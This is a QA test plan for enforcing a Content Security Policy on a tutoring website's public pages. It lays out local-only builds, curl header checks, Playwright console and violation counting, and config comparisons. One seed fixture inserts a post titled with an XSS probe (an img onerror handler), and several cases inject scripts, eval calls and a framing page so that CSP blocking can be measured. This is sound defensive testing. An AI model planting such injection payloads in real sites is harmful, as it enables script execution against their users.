# 06 — Test plan: item 5 (enforcing CSP on public pages, plus the item 9 docs line)

> **Stage:** 6a of /deliver (Tester, T5.10) · **Date:** 26 Oct 2026 · **Branch:** `feature/public-csp`
> (worktree `/Users/sjain/dev/work/aj_classes-items-4-9`)
> **Input:** [01b](01b-requirement-items-4-9.md) item 5 (AC-5.1 to AC-5.11) and item 9,
> [03b](03b-design-items-4-8.md) §0.3 and §5 (§5.7 test approach, §5.8 release),
> [04b](04b-plan-items-4-8.md) §0 and T5.0 to T5.12, [05-dev-notes-item-5.md](05-dev-notes-item-5.md)
> (§3 sweep, O1, D5), [ADR-0005](../../decisions/0005-public-csp-static-headers.md) (as amended for S1),
> [06-security-item-5.md](06-security-item-5.md), [review-5-item-5.md](review-5-item-5.md),
> [06-test-plan-item-4.md](06-test-plan-item-4.md) and [TSR-item-4.md](TSR-item-4.md) (format, strict
> console reading, round 1 lessons), `~/second-brain/Projects/AJClasses/_agents/tester.md`.
> **Next:** `/test-and-ship docs/delivery/2026-10-25-pending-requirements/06-test-plan-item-5.md`
> freezes this list and runs it. IDs are stable: add new cases at the end, never renumber.

**Build under test:** the `feature/public-csp` HEAD at freeze time. This plan was written against
**`d16e4b1`** (code as of **`9de84b3`**; `bbff0c9` and `d16e4b1` are docs only: dev notes §8 and the
`go-live.md` §7c renumber). `9de84b3` holds the Developer's item 5 commits, plus the review 5 and security S1 to S7 fix commits
`19562bf` (`/__spa-fallback` rule), `f5526fd` (hosted-ref guard fails closed, mirror on loopback,
private temp config) and `9de84b3` (Node 22.18). The run doesn't start unless
`git merge-base --is-ancestor d16e4b1 HEAD` exits 0. If more fix commits land before the freeze,
the TSR names that fix SHA too, and HEAD may differ from it only in docs. Record both SHAs.

**Expected values were checked on this branch before writing them** (the item 4 round 1 lesson).
On this branch (`9de84b3` code), read-only: the mirror's headers for every path in phase 2, the robots-meta, `h1` and
JSON-LD counts in `build/client/**/*.html`, the console output of `/nope` and of the enquiry and
subscribe flows on the mirror, the AC-5.8 directive names Chrome reports, the Railway rule-order
swap, the unit test counts, and the scope and `jq` diffs. Where a value depends on the build
(file counts), the expectation is the intent, measured at run time, never a hard-coded number.

**Environment (local only).**

| Name | What | Address |
|---|---|---|
| **DB** | Local Supabase, started from **this worktree** (`project_id = "aj_classes"`) | API `http://127.0.0.1:55321`, DB `:55322`, Mailpit `:55324` |
| **P** | The local-Supabase **production** gate build, served by `pnpm mirror` (the committed `serve.railway.json` rules, Railway's global `X-Robots-Tag` dropped, the local origin in place of the hosted one, analytics stubbed) | `http://127.0.0.1:4173` (loopback only since `f5526fd`; use `127.0.0.1`, not `localhost`, in the browser so the origin is fixed) |
| **PS** | The same, built with `VITE_APP_ENV=staging` (phase 6 only) | `http://127.0.0.1:4173` |
| **R** | The committed Railway config, unsubstituted: `PORT=4174 pnpm --filter web start:railway`. **`curl` only, never a browser** (its CSP names the hosted origin) | `http://127.0.0.1:4174` |
| **D** | Dev server, strict port. The E2E suite starts its own; E-44 starts it for one fixture | `http://localhost:5173` |

- **The hosted project `unzjnxctkyahtmrkinyr` is never read or written.** The committed
  `apps/web/.env.production` points at it, so every build runs with the §1 exports (shell variables
  win over `.env` files in Vite). E-01, E-05 and E-11 enforce this. If any fails, **stop the run**.
- **No real enquiry, subscription or Zoho write.** In every browser leg, Web3Forms
  (`https://api.web3forms.com/**`), Kit (`https://app.convertkit.com/**`) and `leads`
  (`http://127.0.0.1:55321/functions/v1/leads**`) are answered by `route.fulfill` mocks. Chrome
  checks the CSP before Playwright's interception, so a policy gap still shows as a violation
  (dev notes §3, proved again by E-50: the `example.com` route is hit 0 times). The E2E suite's own
  Register Interest spec mocks Web3Forms and uses the local `leads` function, whose Zoho URLs are
  the local stub `host.docker.internal:55398` (`supabase/config.toml`).
- `wa.me` and `example.com` are answered by mocks too, so nothing reaches WhatsApp or a real
  site. The only real non-local host contacted is `challenges.cloudflare.com` (Turnstile's test
  widget) on the portal legs, which the portal CSP allows by design.
- Seed accounts are in `supabase/seed.sql`: `admin@`, `newadmin@`, `tutor@`, `student@`,
  `parent@`, `inactive@local.test`. The local-only password and the local admin authenticator key
  are in the file's header comment. The harness reads them from there and never copies them into
  the TSR. The seed has **0 posts**.

**Full check** (04b §0 steps 1 to 4, from the worktree root, with the three §1 base exports only,
so the sweep's placeholder form keys never reach this build):

```bash
pnpm format:check && pnpm lint && pnpm typecheck && pnpm test && VITE_APP_ENV=production pnpm build \
  && pnpm --filter web check:hosted-ref build/client \
  && pnpm db:test && pnpm test:functions
(cd ~/dev/work/aj_classes-e2e && AJ_CLASSES_DIR=/Users/sjain/dev/work/aj_classes-items-4-9 \
  VITE_LEAD_CAPTURE=on VITE_FORM_ACCESS_KEY=local-placeholder npx playwright test)
lsof -t -nP -iTCP:5173 -sTCP:LISTEN | xargs kill   # the E2E global setup leaves its dev server running
```

**Hard rules for this run.**
1. Local stack only. Banned commands: `supabase link`, `db push`, `config push`,
   `functions deploy`, `secrets set|unset|list`, and anything with `--linked` or `--project-ref`.
   No `curl` to `ajclasses.com.au` or any `*.vercel.app` (those are the release checks, §4).
2. `supabase/.env.deploy` is never opened, `cat`-ed, sourced or grepped. `.env.production` is never
   printed; E-01 reads its variable **names** only.
3. Secret values are never printed. Env checks print names, or `SET` / `unset`, or `equal` / `differ`.
4. Docs-and-test only: no tracked file is edited during the run. Fixtures live in `$SCR`, in the
   local DB, or (E-19 only) as one planted file in the gitignored `build/client`, removed in the
   same case. If a fix is needed, it goes to the Developer, and the run restarts on the new HEAD.
5. Never start a second mirror on :4173. Spare ports: R :4174, swap test :4175, refusal test
   :4176, framer page :4177.

**Strict console reading (team lead, TSR-item-3 E-22 ruling, as item 4).** Every browser leg counts
`console` messages of type `error`, plus `pageerror` events, from the first navigation to the end of
the leg. **A CSP violation is a failure** wherever it shows: a `securitypolicyviolation` event
(listener added by `addInitScript` before any page script) or a console line matching
`Content Security Policy`. Expected is **0** on every leg. The only exceptions are declared here,
and each one is exact (the line, the count, the leg):
- **C1. The 404 document.** On a leg whose page is a 404 (`/nope`, `/portalx`,
  `/__spa-fallbackx`): exactly **1** line, `Failed to load resource: the server responded with a
  status of 404 (Not Found)`, whose `location().url` is the page URL itself. Chrome logs every
  4xx document load. Checked on this branch: with the analytics stub in place, that's the only line.
- **C2. Refused sign-in.** E-43: one line for the `400` from `POST /auth/v1/token`. The app has to
  send that request to learn the account is refused (item 4's A1).
- **C3. Forced failures.** E-27: one `Failed to load resource … 500` line per response the test
  itself forces with `page.route` (equal to the route's hit count), and nothing for the delayed
  response (a timed-out `fetch` logs nothing; if it does log, at most one line naming
  `/rest/v1/posts` per delayed request, recorded).
- **C4. The injections are the measurement.** E-50 to E-54: the console lines and violation events
  are what the case reads. Each must be the CSP refusal for the test's own injection (naming
  `example.com`, `eval`, or the framer page), and E-51's `fetch` adds its
  `Fetch API cannot load https://example.com/…` line. Any other line fails the case.
- **C5. K1 (pre-existing, record only).** E-45's one leg: the `img-src` refusal of the `blob:` photo
  preview. See "Known non-bugs" 1 and ruling 2 (follow-up FU-K1).

Any other line fails the case. pageerror is **0** on every leg, with no exception.

**No hosted requests.** Every browser leg also counts requests whose host ends in `supabase.co`
(expected **0**), and requests to any host outside the leg's allowed set (expected **0**). Public
legs allow `127.0.0.1:4173`, `127.0.0.1:55321` and the mocked hosts (`api.web3forms.com`,
`app.convertkit.com`, `wa.me`, `example.com`, all fulfilled locally). Portal legs add
`challenges.cloudflare.com`. Every public leg also records a HAR. E-32 and E-81 add them up.

**For Saurabh** (not cases; none of these blocks a case's pass or fail):
1. **The Vercel preview check** (03b §5.8 step 1, `go-live.md` §7c). It's behind Vercel's login, so
   only he can do it. It's a release step before `main`, listed in §4 with its steps. The gate
   doesn't wait for it.
2. **Looks:** the phase 3 screenshots (`$EVD/E-21-<page>-<w>-<scheme>.png`, light and dark at 360
   and 1280) are for his eye after the run. Layout is measured (overflow, `h1`, images loaded), so
   the cases pass or fail on numbers.
3. Nothing in this plan needs his accounts, his app config or a paid call.

**Known non-bugs for this run** (don't raise):
1. **K1. The portal photo preview is blocked by the portal CSP.** On My profile, choosing a photo
   shows a `blob:` preview, and the portal policy's `img-src 'self' data: <supabase>` doesn't allow
   `blob:`. Checked on this branch's mirror: `img-src` violation, broken "Preview of your new photo".
   The portal CSP is byte-for-byte the one on `develop` (E-09), so this is pre-existing on the live
   site, not an item 5 change. AC-5.5 forbids changing the portal policy in this item. E-45 records
   it; the photo fixture for E-44 is made on **D** (no CSP) so that the gate legs don't hit it.
   Ruling 2: follow-up ticket FU-K1, its own small branch, on Saurabh's list.
2. **O1 (dev notes):** there's no `og-image.png` and no web manifest. `og:image` points at
   `https://ajclasses.com.au/og-image.png`, which the page never fetches. No web fonts are
   self-hosted (system font stack), so `font-src 'self'` has nothing to load. E-29 checks that
   none of this is requested, and that nothing is CSP-blocked.
3. **The public site has no dark theme** (`styles/theme.css`: "the public site never does"). The
   "dark" legs emulate a dark device (`colorScheme: 'dark'`); the expected result is that public
   pages stay light (`body` background `rgb(255, 255, 255)`), with 0 violations. Portal legs do
   switch (`data-portal-theme="dark"` on `<html>`).
4. **Redirects carry no headers on the mirror.** `serve` answers `/privacy/`, `/portal/`,
   `/index.html`, `/404.html` and `/__spa-fallback.html` with a bare `301`. There's no body, so no
   CSP is needed; E-13 checks the page the redirect lands on.
5. **HSTS isn't sent by `serve`.** It's checked in the committed `vercel.json` (E-09) and live (§4).
6. **D sends no CSP.** The dev server doesn't read `vercel.json`. That's why E2E doesn't exercise
   the policy (dev notes O2); phases 2 to 6 do.
7. **Robots meta in production:** the 14 sitemap pages have **0** `<meta name="robots">`;
   `/subscribed` and the 404 page have exactly **1** (`noindex`). The rule is "never 2" (BUG-1).
8. **`/portalx` loads no analytics.** `root.tsx` skips analytics on any path starting `/portal`.
   Pre-existing and harmless; E-31 doesn't count `/portalx`.
9. Hot reload's `[react-router:hmr] No module update found` isn't an app error. No source is edited
   in this run.

**Team-lead rulings (26 Oct 2026, recorded before freeze).**
1. **C1 to C5 are accepted, narrowly.** C1 is the browser's own line for the 404 document, which the
   server must return. C2 is the refused `inactive@` sign-in. C3 is the `500`s the test forces in
   E-27. C4 is the lines from the injected content in E-50 to E-54, which are what those cases
   measure. C5 is K1, recorded only. Everything else must be **0** on every leg: 0 CSP
   violations, 0 app `console.error` and 0 `pageerror`.
2. **K1 is a real live bug, but not item 5's.** The portal CSP has no `blob:` in `img-src`, so the
   photo preview is blocked. AC-5.5 stays as written (the portal policy is unchanged). E-45 records
   K1, and the E-44 photo fixture is set up on **D**. The coordinator raises it as follow-up ticket
   **FU-K1**, to be fixed on its own small branch, and it goes on Saurabh's list.
3. **`/PORTAL/login` goes into the live checks** as §4 check 2(f). Expected: exactly **1** CSP, and
   it must be the portal one, or the response must be a `404`. The public CSP there is never
   acceptable.
4. **Dark means the device is set to dark.** The public pages stay light by design, so the expected
   background is `rgb(255, 255, 255)`, with no contrast loss (E-21 compares each dark leg with its
   light leg).
5. Noted: the `:4199` mirror in dev notes §8 was the Tester's read-only probe. No action.

---

## 1. Set-up (once per terminal, before any build or server)

```bash
cd /Users/sjain/dev/work/aj_classes-items-4-9
pnpm db:status                                   # else pnpm db:start (from this worktree)
export VITE_SUPABASE_URL=http://127.0.0.1:55321
export VITE_SUPABASE_PUBLISHABLE_KEY=<PUBLISHABLE_KEY from pnpm db:status>
export VITE_TURNSTILE_SITE_KEY=1x00000000000000000000AA      # Cloudflare's public always-pass test key
export SCR=<session scratch dir>
export EVD=$PWD/docs/test-reports/2026-10-26-feature-public-csp/evidence
mkdir -p "$EVD"
alias q='docker exec supabase_db_aj_classes psql -U postgres -At -c'
ADM=$(q "select id from public.profiles where email='admin@local.test'")
TUT=$(q "select id from public.profiles where email='tutor@local.test'")
NADM=$(q "select id from auth.users where email='newadmin@local.test'")
ln -sfn ~/dev/work/aj_classes-e2e/node_modules "$SCR/node_modules"   # reuse the E2E repo's Playwright
```

**Gate build** (03b §5.7), used from phase 2 on. The sweep exports go in a subshell, so they never
leak into the full check or E2E:

```bash
( export VITE_LEAD_CAPTURE=on VITE_FORM_ACCESS_KEY=local-placeholder VITE_KIT_FORM_ID=0000000
  VITE_APP_ENV=production pnpm build )
pnpm --filter web check:hosted-ref build/client > "$EVD/gate-check.txt" 2>&1; echo "exit $?" >> "$EVD/gate-check.txt"
# Count before the mirror adds its analytics stub, so N matches the check above (E-11)
find apps/web/build/client -type f | grep -viE '\.(png|jpe?g|gif|webp|ico|woff2?|avif)$' | wc -l > "$EVD/gate-n.txt"
pnpm mirror > "$EVD/mirror.log" 2>&1 &            # P on 127.0.0.1:4173; runs check:hosted-ref itself
```

**Reference strings** (built from the committed files at run time, never typed by hand):

```bash
LOCAL=http://127.0.0.1:55321
PUB_HOSTED=$(jq -r '.headers[] | select(.source|startswith("/((?!portal")) | .headers[] | select(.key=="Content-Security-Policy") | .value' apps/web/vercel.json)
POR_HOSTED=$(jq -r '.headers[] | select(.source=="/portal/:path*") | .headers[] | select(.key=="Content-Security-Policy") | .value' apps/web/vercel.json)
PUB_LOCAL=${PUB_HOSTED//https:\/\/unzjnxctkyahtmrkinyr.supabase.co/$LOCAL}
POR_LOCAL=${POR_HOSTED//https:\/\/unzjnxctkyahtmrkinyr.supabase.co/$LOCAL}
# hdr <base> <path>: GET (not HEAD, as a browser does), prints status, CSP count, and which policy
hdr() { curl -s -o /dev/null -D - "$1$2" | tr -d '\r' > "$SCR/h.txt"
        printf '%s %s csp=%s kind=%s\n' "$2" "$(head -1 "$SCR/h.txt" | cut -d' ' -f2)" \
          "$(grep -ci '^content-security-policy:' "$SCR/h.txt")" \
          "$(v=$(grep -i '^content-security-policy:' "$SCR/h.txt" | cut -d' ' -f2-)
             case "$v" in "$PUB_LOCAL") echo public-local;; "$POR_LOCAL") echo portal-local;;
               "$PUB_HOSTED") echo public-hosted;; "$POR_HOSTED") echo portal-hosted;; *) echo other;; esac)"; }
```

**Page lists** (from the build, so a new page can't be missed):
- **P16** = `/`, `/privacy`, `/resources`, `/posts`, `/subscribed`, `/nope`, plus every
  `build/client/programmes/*/index.html` and `build/client/resources/*/index.html` as a path. On
  `9de84b3` that's 9 programme pages and 1 guide, so **16** paths. Fewer fails the case; more is
  recorded and swept.
- **SITEMAP** = every `<loc>` in `build/client/sitemap.xml` (14 on `9de84b3`), mapped to P. Each
  one must be in P16.

**Browser harness** (`$SCR/sweep.mjs`, written at run time; Google Chrome through the E2E repo's
Playwright, `channel: 'chrome'`, headless; record the Chrome version). Each leg is a fresh context
with a HAR (`$EVD/har/<case>-<page>-<w>-<scheme>.har`), and before the first navigation:
- the mocks above, each counting its hits and keeping the request URL and body;
- `addInitScript`: a `securitypolicyviolation` listener pushing
  `effectiveDirective|blockedURI|disposition` into `window.__csp`;
- `page.on('console')` (type `error`), `page.on('pageerror')`, `page.on('request')` (host check)
  and `page.on('response')` (status of every response, and the document's `headersArray()`).

Sizes: **360** = 360 × 780, **1280** = 1280 × 800. **Light** / **dark** = `colorScheme: 'light'` /
`'dark'`. "Loaded" = `waitUntil: 'load'`, then `networkidle` with a 10 s cap, then 500 ms (portal
legs: `load` plus 1 s, because Turnstile keeps a connection open). "Overflow" =
`document.documentElement.scrollWidth − clientWidth`. "Images ok" = every `document.images` entry
has `complete && naturalWidth > 0`.

**Injection harness note (AC-5.8).** Code passed to `page.evaluate` runs through DevTools, which
Chrome lets bypass the `eval` check. Checked on this branch: `eval('1+1')` inside an injected
`<script>` that runs **during** `page.evaluate` returned `2`; the same call run from a
`setTimeout(fn, 0)` threw `EvalError` with a `script-src` violation. So E-52 runs its probes in a
deferred task and reads the result afterwards. Network-loaded injections (script `src`, `fetch`,
images) aren't affected.

**Seed-data order and fixtures.** Each fixture is applied right before the case that needs it and
removed at the end of the named case, so earlier cases run on the seed. E-02 takes the snapshot
that E-80 compares against.

| Fixture | What | Applied right before | Removed by |
|---|---|---|---|
| X1 | One post, so the News link and the `/posts` list show: `q "insert into public.posts (title, body, author_id) values ('e2e-item5 <img src=x onerror=\"document.title=''xss''\">', 'Item 5 CSP check post. Local only.', '$ADM') returning id"` → `POST` | E-26 (phases 3's "with posts" half) | E-27 last step: `q "delete from public.posts where title like 'e2e-item5%'"`; count back to **0** |
| X2 | A profile photo for `tutor@`, uploaded **on D** through My profile (Choose a photo → `$SCR/red.png`, a 64 × 64 PNG made with Python's `zlib`/`struct` → Use this photo), so the gate legs never touch the K1 preview | E-44 | E-44 last step: on D, Remove photo (accept the confirm); `q "select coalesce(avatar_path,'null') from public.profiles where id='$TUT'"` = `null`; avatar object count back to the snapshot |
| X3 | Framer page `$SCR/framer/index.html`: `<!doctype html><link rel="icon" href="data:,"><iframe src="http://127.0.0.1:4173/"></iframe>`, served by `python3 -m http.server 4177 --bind 127.0.0.1 --directory $SCR/framer` | E-54 | E-54: stop the server; port 4177 free |
| X4 | Planted hosted-ref file `apps/web/build/client/zz-hosted-probe.js` containing `unzjnxctkyahtmrkinyr` (gitignored build folder) | E-19 | E-19 last step: `rm` it; `check:hosted-ref build/client` → `0 files` again |

---

## 2. Cases

Phases run in this order: **0** safety, **1** repo and committed config, **2** gate build and
headers (`curl`), **3** public sweep on P, **4** portal on P, **5** invalid states on P, **6**
staging marker on PS, **7** docs, **8** close-out. Within a phase, run in table order. Phase 1's
E2E run starts and leaves its own server on :5173; kill it before phase 2.

### Phase 0 — safety guards (stop the run if any fails)

| ID | AC | Area | Case | Steps | Expected (measurable) | Env |
|---|---|---|---|---|---|---|
| E-01 | 5.11, §0.3 | Safety | Shell, builds and E2E point at the local stack only | 1. `echo $VITE_SUPABASE_URL`; compare `$VITE_SUPABASE_PUBLISHABLE_KEY` with `pnpm db:status`'s key (print `equal` / `differ`). 2. `ls -a apps/web \| grep -E '^\.env'`; `cut -d= -f1 apps/web/.env.production \| grep -v '^#' \| grep .` (names only). 3. `grep -E '^(SUPABASE_REST_URL\|PG_HOST\|PG_PORT\|WEB_BASE_URL\|MAILPIT_URL)=' ~/dev/work/aj_classes-e2e/.env`; `grep -c 'supabase.co' ~/dev/work/aj_classes-e2e/.env`. 4. `env \| cut -d= -f1 \| grep -xE 'SUPABASE_ACCESS_TOKEN\|SUPABASE_DB_PASSWORD\|RESEND_API_KEY\|TURNSTILE_SECRET\|ZOHO_[A-Z_]+\|VITE_KIT_FORM_ID\|VITE_FORM_ACCESS_KEY\|VITE_LEAD_CAPTURE'`. 5. `git rev-parse HEAD`; `git merge-base --is-ancestor d16e4b1 HEAD; echo $?`; `git branch --show-current`; `git status --short` | 1: exactly `http://127.0.0.1:55321`; `equal`. 2: `.env.example` and `.env.production` only; names exactly `VITE_SUPABASE_URL`, `VITE_SUPABASE_PUBLISHABLE_KEY`, `VITE_TURNSTILE_SITE_KEY`, `VITE_LEAD_CAPTURE` (all four overridden or neutral in every build: the first three by the exports, the fourth by the sweep subshell or harmless in the full-check build). 3: `SUPABASE_REST_URL=http://127.0.0.1:55321`, `PG_HOST` `127.0.0.1` or `localhost`, `PG_PORT=55322`, `WEB_BASE_URL=http://localhost:5173`, `MAILPIT_URL=http://127.0.0.1:55324`; `supabase.co` **0**. 4: **no output** (the sweep keys live only in the build subshell). 5: HEAD recorded; `0`; `feature/public-csp`; clean apart from the untracked `docs/test-reports/2026-10-26-feature-public-csp/` evidence folder. **Any failure: stop** | DB |
| E-02 | §0.3 | Safety | Stack started and reset from this worktree; seed snapshot | 1. `pnpm db:reset`. 2. `docker inspect supabase_edge_runtime_aj_classes --format '{{range .Mounts}}{{.Source}}{{"\n"}}{{end}}' \| grep -c aj_classes-items-4-9`. 3. `q "select max(version) from supabase_migrations.schema_migrations"`; `ls supabase/migrations \| tail -1`. 4. Snapshot to `$SCR/snapshot-start.txt`: profile count; `select count(*) from public.posts`; `select count(*) from public.enquiries`; `select count(*) from storage.objects where bucket_id='avatars'`; `select coalesce(avatar_path,'null') from public.profiles where id='$TUT'`; `select count(*) from auth.mfa_factors where user_id='$NADM'`; `select count(*) from public.profiles where email like 'e2e-%'` | 1: exit 0. 2: **1** (else `pnpm db:stop && pnpm db:start` here, then repeat). 3: both `20261026100000` (item 4's; item 5 adds no migration). 4: profiles **6**, posts **0**, avatars **0**, tutor `null`, `e2e-%` **0**; enquiries and factors recorded. **Any failure in 2–3: stop** | DB |
| E-03 | §0.3 | Safety | `.env.deploy` untouched; no banned command; no live host contacted | `git check-ignore -q supabase/.env.deploy; echo $?` (doesn't open it). At close-out: `grep -nE 'env\.deploy\|db push\|config push\|functions deploy\|secrets (set\|unset\|list)\|--linked\|--project-ref\|supabase link\|ajclasses\.com\.au\|vercel\.app' <the TSR's command log>` | `0`; the log has no such command (a URL inside a `jq` or `grep` pattern in this plan isn't a request; only `curl`/browser targets count) | — |

### Phase 1 — repo checks and committed config

| ID | AC | Area | Case | Steps | Expected (measurable) | Env |
|---|---|---|---|---|---|---|
| E-04 | DoD, all | Full check | Repo full check (header, lines 1–3) | Run with the three base exports; log to `$EVD/E-04-fullcheck.log` | Every step exit 0. Lint 0 problems. `pnpm test` 0 failed, **≥ 54 files / ≥ 462 tests** (counted on `9de84b3`), and the list includes `src/hosting-csp.test.ts`, `src/hosting-config.test.ts`, `scripts/hosted-ref.test.ts`, `scripts/mirror-config.test.ts` (those four: **≥ 28 tests**). `db:test` 0 failed, **≥ 14 files / ≥ 507 tests**. `test:functions` **≥ 169 `ok`, 0 `NOT OK`**. The hosted-ref step prints `check-hosted-ref: 0 files (of N scanned)` with N ≥ 1. Fewer tests means one was dropped: fail. Record the counts | DB |
| E-05 | 5.11 | Hosted refs | The full-check build is a local-Supabase build with no hosted ref, in any file type | After E-04's build: `N=$(find apps/web/build/client -type f \| grep -viE '\.(png\|jpe?g\|gif\|webp\|ico\|woff2?\|avif)$' \| wc -l)`; the E-04 `check-hosted-ref` line; `grep -rl unzjnxctkyahtmrkinyr apps/web/build/client \| wc -l` (every file type, binaries too); `grep -rl '127.0.0.1:55321' apps/web/build/client \| wc -l` | `0 files (of N scanned)`, with N equal to the `find` count (every non-binary file read: the fail-closed fix, S5). The all-files grep **0**. Local origin **≥ 1** file (the build really is the local one). Don't grep for `supabase.co`: supabase-js's vendor bundle carries a `*.supabase.co` allow-list literal (TSR-item-4 R1), which isn't a configured ref | — |
| E-06 | 5.4 (regr.) | E2E | External E2E suite (header, line 4) | Run it; then `lsof -t -nP -iTCP:5173 -sTCP:LISTEN \| xargs kill`; `q "select count(*) from public.profiles where email like 'e2e-%'"`; same for `public.posts` (title) and `public.enquiries` (email) | **9 passed**, 0 failed (admin posts, invite onboarding, Our Approach, Register Interest, admin 2FA login). All three counts **0**. Port 5173 free | DB, D (own) |
| E-07 | 03b §5.1 | Scope guard | Only config, scripts and tests changed; no runtime code, migration or dependency | `git diff --name-only develop...HEAD -- apps package.json pnpm-lock.yaml supabase`; `diff <(git show develop:apps/web/package.json \| jq -S '.dependencies,.devDependencies') <(jq -S '.dependencies,.devDependencies' apps/web/package.json); echo $?`; `git diff --quiet develop...HEAD -- pnpm-lock.yaml supabase apps/web/src/routes apps/web/src/components apps/web/src/services apps/web/src/constants apps/web/src/root.tsx; echo $?` | Exactly these **13** files: `apps/web/package.json`, `apps/web/scripts/{check-hosted-ref.ts,hosted-ref.test.ts,hosted-ref.ts,hosting-constants.ts,mirror-config.test.ts,mirror-config.ts,serve-mirror.ts}`, `apps/web/serve.railway.json`, `apps/web/src/{hosting-config.test.ts,hosting-csp.test.ts}`, `apps/web/vercel.json`, `package.json`. Any other or missing file fails. `0` (same dependencies). `0` (no runtime, lockfile or database change) | — |
| E-08 | Repo rules | Code rules | Added lines follow the repo rules | `git diff develop...HEAD -- apps/web \| grep -E '^\+' \| grep -nP 'console\.(log\|debug)\|style=\{\{\|: any\b\|TODO(?! \[)\|innerHTML\|dangerouslySetInnerHTML\|document\.(querySelector\|getElementById)'`; `grep -rnE 'dangerouslySetInnerHTML\|\.innerHTML\s*=' apps/web/src \| wc -l` | **0** lines (the CLIs' `console.error` and `process.stdout.write` are allowed by 03b §0.2 and aren't matched). `0`: no HTML from data anywhere, which is what makes `'unsafe-inline'` acceptable (security residual 1) | — |
| E-09 | 5.1, 5.2, 5.5, 5.6 | Committed policy | The committed files carry the agreed policies, the hosted host and no local origin; everything else is as on `develop` | 1. `jq -r '.headers[].source' apps/web/vercel.json`. 2. `[ "$PUB_HOSTED" = "$(jq -r '.headers[] \| select(.source=="**/*") \| .headers[] \| select(.key=="Content-Security-Policy") \| .value' apps/web/serve.railway.json)" ] && echo pub-equal`; same for `$POR_HOSTED` against Railway's `__spa-fallback.html` rule and Vercel's `/__spa-fallback` rule. 3. `grep -o 'https://unzjnxctkyahtmrkinyr.supabase.co' <<< "$PUB_HOSTED" \| wc -l`; `grep -cE '127\.0\.0\.1\|localhost' apps/web/vercel.json apps/web/serve.railway.json`. 4. Parse `$PUB_HOSTED` into directives (`tr ';' '\n'`, trim). 5. `grep -cE "(^\| )(\*\|https?:)(;\| \|$)\|\*\." <<< "$PUB_HOSTED"`; `grep -ci 'report-only\|report-uri\|report-to' apps/web/vercel.json apps/web/serve.railway.json`. 6. `diff <(git show develop:apps/web/vercel.json \| jq '.headers[0], .rewrites, (.headers[] \| select(.source=="/portal/:path*"))') <(jq '.headers[0], .rewrites, (.headers[] \| select(.source=="/portal/:path*"))' apps/web/vercel.json); echo $?`; `diff <(git show develop:apps/web/serve.railway.json \| jq .) <(jq 'del(.headers[0].headers[-1])' apps/web/serve.railway.json); echo $?` | 1: exactly 4 rules, in order: `/(.*)`, `/((?!portal(?:/\|$)\|__spa-fallback$).*)`, `/__spa-fallback`, `/portal/:path*`. 2: `pub-equal`, and the portal CSP equal in all three places. 3: **1**; **0** and **0**. 4: exactly these 11 directives: `default-src 'self'`; `script-src 'self' 'unsafe-inline'`; `style-src 'self' 'unsafe-inline'`; `img-src 'self' data:`; `font-src 'self'`; `connect-src 'self' https://unzjnxctkyahtmrkinyr.supabase.co https://api.web3forms.com https://app.convertkit.com`; `frame-src 'none'`; `object-src 'none'`; `base-uri 'self'`; `form-action 'self'` (no Kit host: the subscribe form posts by `fetch`, so `connect-src` covers it); `frame-ancestors 'none'`. 5: **0** wildcards; **0** report directives (enforcing; reporting is deferred to B14). 6: `0` (global rule incl. HSTS, rewrites and portal rule unchanged); `0` (Railway's only change is the CSP appended to `**/*`) | — |
| E-10 | 5.2 | Rationale | The `'unsafe-inline'` choice is written down, with the reason | `grep -n "Why \`'unsafe-inline'\`" docs/decisions/0005-public-csp-static-headers.md`; read the block below it | 1 hit. The block names nonces (need a per-request server) and hashes (change every build; static `vercel.json` can't carry them), and states that inline `on*` handlers run as a consequence | — |

### Phase 2 — gate build and headers (`curl` on P and R)

Build the gate build and start **P** (§1). Every `hdr` call uses GET.

| ID | AC | Area | Case | Steps | Expected (measurable) | Env |
|---|---|---|---|---|---|---|
| E-11 | 5.11, 5.1 | Gate build | The sweep build is guarded, local, and served the safe way | 1. `cat $EVD/gate-check.txt $EVD/gate-n.txt` (§1, taken before the mirror started); `grep -rl unzjnxctkyahtmrkinyr apps/web/build/client \| wc -l`. 2. `head -2 "$EVD/mirror.log"`. 3. `lsof -nP -iTCP:4173 -sTCP:LISTEN \| awk 'NR>1{print $9}'`. 4. `C=$(ps -o command= -p $(lsof -t -nP -iTCP:4173 -sTCP:LISTEN) \| sed -E 's/.*--config ([^ ]+).*/\1/')`; `stat -f '%Lp' "$(dirname $C)" "$C"`; `grep -c unzjnxctkyahtmrkinyr "$C"`; `grep -o '127.0.0.1:55321' "$C" \| wc -l`. 5. `wc -c < apps/web/build/client/_vercel/insights/script.js`. 6. `grep -c 'Stay in the loop' apps/web/build/client/index.html`; `grep -rl local-placeholder apps/web/build/client \| wc -l` | 1: `0 files (of N scanned)` and `exit 0`, N = the `gate-n.txt` count; grep **0**. 2: `serve-mirror: http://127.0.0.1:4173 (Supabase http://127.0.0.1:55321)`. 3: only `127.0.0.1:4173` (loopback, S3). 4: `700` and `600` (S4); hosted ref **0**; local origin **3** (public `connect-src`, portal `img-src` and `connect-src`). 5: `0` (empty stub). 6: `1` (subscribe form built in, `VITE_KIT_FORM_ID` placeholder); `≥ 1` (placeholder Web3Forms key, not a real one) | P |
| E-12 | 5.1 | CSP on public pages | Every public page sends exactly one enforcing public CSP | `for p in <P16>; do hdr http://127.0.0.1:4173 $p; done`; also count `content-security-policy-report-only` lines; `grep -l 'http-equiv="Content-Security-Policy"' -ri apps/web/build/client \| wc -l` | **16** lines. Status `200`, except `/nope` **`404`**. Every line `csp=1 kind=public-local` (the committed public policy, byte for byte, with only the local origin substituted). Report-only **0**. Meta CSP **0** (one policy, from the header only) | P |
| E-13 | 5.1 | Other public responses | The SPA-fallback name, 404 variants, assets, query strings and redirects | `hdr` for `/404`, `/portalx`, `/__spa-fallbackx`, `/sitemap.xml`, `/robots.txt`, `/favicon.svg`, one `/assets/*.js` (first from `ls build/client/assets`), `/_vercel/insights/script.js`, `/?utm_source=test`, `/programmes/vce?x=1`. Redirects: for `/privacy/`, `/index.html`, `/404.html`: `curl -s -o /dev/null -D - <url> \| grep -iE '^(HTTP\|location)'`, then `curl -sIL <url>` final status and CSP count | `/404` `200`, `/portalx` `404`, `/__spa-fallbackx` `404` (the lookahead excludes exactly `__spa-fallback`); the rest `200`. Every line `csp=1 kind=public-local`. Redirects: `301` with `Location: /privacy`, `/index`, `/404` respectively; each final response `200` with exactly **1** public CSP (non-bug 4) | P |
